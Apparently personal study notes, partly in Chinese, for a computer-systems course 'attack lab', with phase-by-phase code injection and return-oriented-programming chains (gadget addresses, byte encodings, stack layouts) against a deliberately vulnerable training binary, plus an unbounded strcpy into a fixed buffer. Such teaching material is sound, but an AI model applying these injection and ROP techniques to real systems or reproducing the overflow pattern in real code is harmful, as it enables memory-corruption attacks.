void foo(char *input){
    char buf[32];
    ...
    strcpy (buf, input);
    return;
}

// gadgets
address1: mov %rbx, %rax; ret
address2: pop %rbx; ret


// phase 1
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}

void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}


// phase 2
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
// 注入代码 p2.s
mov $0x45374fee,%rdi # set my cookie as the first parameter
pushq $0x401860
ret
// 转换对应机器码
gcc -c p2.s
objdump -d p2.o > p2.byte


// phase 3
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}


// phase 4
void setval_210(unsigned *p){
    *p = 3347663060U;
}

0x00401860 (最后是 touch2 的入口地址，进行调用)
-------
0x00401a2b (把 %rax 的值放入到 %rdi 中，作为参数) -> gadget 2
-------
0x45374fee (我的 cookie，会被 gadget 1 存入到 %rax 中)
-------
0x00401a24 (旧的返回地址会被这里覆盖) -> gadget 1
-------
....
buf (缓冲区，这里随便写点啥都可以，反正都不能执行)
-------


// phase 5
栈顶
mov  %rsp, %rax 48 89 e0 c3    0x401b11
mov  %rax, %rdi 48 89 c7 c3    0x401a2b
pop  %rax       58 c3          0x401a24
constant 0x48
movl %eax, %ecx 89 c1 20 c9 c3 0x401a98 (20 c9 没有影响)
movl %ecx, %edx 89 ca 28 c0 c3 0x401ac8 (38 c0 没有影响)
movl %edx, %esi 89 d6 38 c0 c3 0x401a68 (38 c0 没有影响)
lea  (%rdi, %rsi, 1), %rax     0x401a48
mov  %rax, %rdi 48 89 c7 c3    0x401a2b
touch3 的地址
cookie 的字符串
栈底
